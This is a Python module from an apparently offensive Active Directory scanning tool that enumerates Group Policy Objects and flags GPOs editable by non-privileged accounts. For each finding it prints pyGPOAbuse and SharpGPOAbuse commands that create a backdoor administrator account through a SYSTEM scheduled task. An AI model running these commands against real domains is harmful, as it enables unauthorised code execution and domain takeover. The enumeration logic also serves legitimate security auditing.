"""
GPO module — list Group Policy Objects and analyse who can edit them.

Inventory is the easy half. The offensive half is **edit rights**: a GPO is a
code-execution primitive over every machine/user in the OUs (and sites) it is
linked to. If a non-privileged principal holds a write right on a
`groupPolicyContainer` object (GenericWrite / GenericAll / WriteDACL / WriteOwner
/ WriteProperty), they can push a scheduled task / startup script / immediate
task (SharpGPOAbuse, pyGPOAbuse) to that scope. The blast radius — and therefore
the severity — is set by **where the GPO is linked**:

* domain root or the **Domain Controllers** OU → CRITICAL (domain / DC takeover);
* any other OU, or a site → HIGH;
* editable but linked nowhere → MEDIUM (latent — a link makes it live).

Links are read from the `gPLink` attribute on OU / domain / site objects; edit
rights from each GPO's `nTSecurityDescriptor` (reuses modules.acls._parse_dacl),
filtering already-privileged trustees via utils.sids. Pure LDAP.

⚠️ NOT VALIDATED LIVE (v2.13.0): the edit-rights / linked-scope analysis is
   implemented and unit-tested against synthetic descriptors, but never run
   against a real DC. (Plain GPO inventory was validated earlier.)
"""

from modules.base import BaseModule, ScanContext
from core.output import Severity, C
from utils.ldap_helpers import get_attr, get_list, get_raw, get_dn, SCOPE_SUBTREE
from utils.sids import resolve_sid, is_privileged_sid
from modules.acls import (
    _parse_dacl, GENERIC_ALL, GENERIC_WRITE, WRITE_DACL, WRITE_OWNER,
    RIGHT_DS_WRITE_PROP, FULL_CONTROL,
)

_GPO_FILTER  = "(objectClass=groupPolicyContainer)"
_ATTRS = [
    "displayName", "gPCFileSysPath", "distinguishedName",
    "flags", "whenCreated", "whenChanged", "nTSecurityDescriptor",
]

# Any of these in a GPC ACE mask = the trustee can edit the GPO's settings.
_EDIT_BITS = (GENERIC_ALL | GENERIC_WRITE | WRITE_DACL | WRITE_OWNER
              | RIGHT_DS_WRITE_PROP)

# Contextual / system trustees that legitimately hold full control on every GPO.
_SKIP_SIDS = {
    "S-1-5-18",      # Local System
    "S-1-3-0",       # Creator Owner
    "S-1-5-9",       # Enterprise Domain Controllers
    "S-1-5-32-544",  # BUILTIN\Administrators
}

# Known dangerous GPO names (case-insensitive partial match)
_INTERESTING = [
    "default domain policy",
    "default domain controller",
    "password", "bitlocker", "applocker",
    "screensaver", "logon", "startup", "shutdown",
    "software install", "laps",
]

_SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2}


def _is_interesting(name: str) -> bool:
    n = name.lower()
    return any(kw in n for kw in _INTERESTING)


def _gpo_guid(dn: str) -> str:
    """Leftmost RDN value of a GPC DN: 'CN={GUID},CN=Policies,…' → '{GUID}'."""
    if not dn:
        return ""
    first = dn.split(",", 1)[0]
    return first.split("=", 1)[-1] if "=" in first else first


def _parse_gplink(value: str):
    """Parse a gPLink value → list of (gpo_dn_lower, enabled).

    Format: '[LDAP://<dn>;<opts>][LDAP://<dn>;<opts>]…' where opts bit0 = link
    disabled, bit1 = enforced.
    """
    out = []
    for block in value.split("["):
        block = block.strip().rstrip("]")
        if not block.upper().startswith("LDAP://"):
            continue
        body = block[7:]
        if ";" not in body:
            out.append((body.strip().lower(), True))
            continue
        dn, _, opt = body.rpartition(";")
        try:
            enabled = not (int(opt) & 1)
        except ValueError:
            enabled = True
        out.append((dn.strip().lower(), enabled))
    return out


class GPOModule(BaseModule):
    name        = "gpo"
    description = "Group Policy enumeration + edit-rights / linked-scope abuse analysis"

    def run(self, ctx: ScanContext) -> None:
        out = ctx.out
        out.section("GROUP POLICY OBJECTS")

        entries = ctx.conn.search(_GPO_FILTER, _ATTRS)
        if not entries:
            out.warning("No GPOs found (check permissions)")
            return

        gpos = []
        for entry in entries:
            name    = get_attr(entry, "displayName")
            path    = get_attr(entry, "gPCFileSysPath")
            dn      = get_attr(entry, "distinguishedName") or get_dn(entry)
            changed = get_attr(entry, "whenChanged")
            flags   = get_attr(entry, "flags")

            status = ""
            try:
                f = int(flags)
                if f == 1:   status = "User config disabled"
                elif f == 2: status = "Computer config disabled"
                elif f == 3: status = "All settings disabled"
            except (ValueError, TypeError):
                pass

            gpos.append({
                "name":    name,
                "path":    path,
                "dn":      dn,
                "guid":    _gpo_guid(dn),
                "sd":      get_raw(entry, "nTSecurityDescriptor"),
                "changed": str(changed),
                "status":  status,
                "notable": _is_interesting(name),
            })

        out.counter("GPOs", len(gpos), {
            "notable": sum(1 for g in gpos if g["notable"]),
        })

        # Notable GPOs first
        notable = [g for g in gpos if g["notable"]]
        if notable:
            out.subsection("Notable GPOs")
            rows = [[g["name"], g["path"], g["status"] or "enabled"] for g in notable]
            out.table(
                ["Name", "Path", "Status"],
                rows,
                highlight_fn=lambda r: C.CYAN,
            )

        # All GPOs (verbose)
        if ctx.out.verbose:
            out.subsection("All GPOs")
            rows = [
                [g["name"], g["changed"], g["status"] or "enabled", g["path"]]
                for g in gpos
            ]
            out.table(["Name", "Last Changed", "Status", "Path"], rows)

        # Edit-rights / linked-scope abuse analysis
        self._check_edit_rights(ctx, gpos)

    # -------------------------------------------------------------- linked scopes
    def _build_link_map(self, ctx: ScanContext):
        """gpo_dn_lower → list of (scope_label, severity, enabled)."""
        bases = [ctx.base_dn]
        cfg = getattr(ctx.conn.dc_info, "config_dn", "")
        if cfg:
            bases.append(cfg)   # site links live in the configuration NC

        link_map: dict[str, list] = {}
        base_lower = ctx.base_dn.lower()
        for base in bases:
            entries = ctx.conn.search(
                "(gPLink=*)",
                ["gPLink", "objectClass", "name", "distinguishedName"],
                base=base, scope=SCOPE_SUBTREE,
            )
            for e in entries:
                gplink = get_attr(e, "gPLink")
                if not gplink:
                    continue
                sdn     = (get_attr(e, "distinguishedName") or get_dn(e))
                classes = {c.lower() for c in get_list(e, "objectClass")}
                label, sev = self._scope_crit(sdn, classes, get_attr(e, "name"),
                                               base_lower)
                for gpo_dn, enabled in _parse_gplink(gplink):
                    link_map.setdefault(gpo_dn, []).append((label, sev, enabled))
        return link_map

    @staticmethod
    def _scope_crit(dn: str, classes: set, name: str, base_lower: str):
        d = dn.lower()
        if "domaindns" in classes or d == base_lower:
            return ("Domain root", "CRITICAL")
        if d.startswith("ou=domain controllers,"):
            return ("Domain Controllers OU", "CRITICAL")
        if "site" in classes or ",cn=sites,cn=configuration," in d:
            return (f"Site: {name or dn}", "HIGH")
        return (f"OU: {name or dn}", "HIGH")

    # -------------------------------------------------------------- edit rights
    def _check_edit_rights(self, ctx: ScanContext, gpos: list) -> None:
        out = ctx.out
        out.subsection("GPO edit rights (abuse surface)")

        dsid = ctx.domain_sid
        my_sids = set(ctx.current_user_sids)
        link_map = self._build_link_map(ctx)

        findings = []   # dict per editable GPO
        for g in gpos:
            if not g["sd"]:
                continue
            editors = []   # (name, sid, mine)
            seen = set()
            for ace in _parse_dacl(g["sd"]):
                sid = ace["sid"]
                if sid in seen or sid in _SKIP_SIDS or is_privileged_sid(sid, dsid):
                    continue
                mask = ace["mask"]
                if (mask & _EDIT_BITS) or (mask & FULL_CONTROL) == FULL_CONTROL:
                    seen.add(sid)
                    editors.append((resolve_sid(sid, dsid), sid, sid in my_sids))
            if not editors:
                continue

            scopes = link_map.get(g["dn"].lower(), [])
            if scopes:
                worst = min((_SEV_ORDER[s[1]] for s in scopes), default=2)
                sev = next(k for k, v in _SEV_ORDER.items() if v == worst)
                scope_lbl = ", ".join(sorted({
                    s[0] + ("" if s[2] else " (link disabled)") for s in scopes}))
            else:
                sev, scope_lbl = "MEDIUM", "(not linked)"
            findings.append({
                "gpo": g["name"] or g["guid"], "guid": g["guid"],
                "editors": editors, "sev": sev, "scope": scope_lbl,
            })

        if not findings:
            out.success("No GPO is editable by a non-privileged principal")
            return

        findings.sort(key=lambda f: _SEV_ORDER[f["sev"]])

        rows = []
        for f in findings:
            ed = ", ".join(n + (" (you)" if mine else "")
                           for (n, _s, mine) in f["editors"])
            rows.append([f["gpo"], ed, f["scope"], f["sev"]])
        out.table(["GPO", "Editable by", "Linked scope", "Severity"], rows, indent=4,
                  highlight_fn=lambda r: C.RED if r[3] == "CRITICAL"
                  else (C.YELLOW if r[3] == "HIGH" else None))

        sev_map = {"CRITICAL": Severity.CRITICAL, "HIGH": Severity.HIGH,
                   "MEDIUM": Severity.MEDIUM}
        for f in findings:
            ed = ", ".join(n + (" [current identity]" if mine else "")
                           for (n, _s, mine) in f["editors"])
            ctx.quick_wins.add(
                sev_map[f["sev"]],
                f"GPO '{f['gpo']}' is editable by a non-privileged principal",
                f"Editable by: {ed}\n"
                f"Linked scope: {f['scope']}\n"
                "A write right on the GPO = code execution on every computer/user "
                "in that scope (scheduled task / startup script / immediate task). "
                "If you control one of the principals above:\n"
                f"  # Linux (pyGPOAbuse) — adds a scheduled task running as SYSTEM:\n"
                f"  python3 pygpoabuse.py '{self._upn(ctx)}:<password>' "
                f"-gpo-id '{f['guid']}' -dc-ip {ctx.args.dc} "
                "-command 'net user hacker P@ssw0rd! /add && "
                "net localgroup administrators hacker /add'\n"
                "  # Windows (SharpGPOAbuse):\n"
                f"  SharpGPOAbuse.exe --AddComputerTask --TaskName Update "
                f"--Author {self._upn(ctx)} --Command cmd.exe "
                f"--Arguments \"/c net user ...\" --GPOName \"{f['gpo']}\"",
            )

    # --------------------------------------------------------------- helpers
    @staticmethod
    def _upn(ctx: ScanContext) -> str:
        a = ctx.args
        user = (getattr(a, "username", "") or "").split("@")[0] or "<user>"
        dom  = ctx.domain or (getattr(a, "domain", "") or "")
        return f"{dom}\\{user}" if dom else user
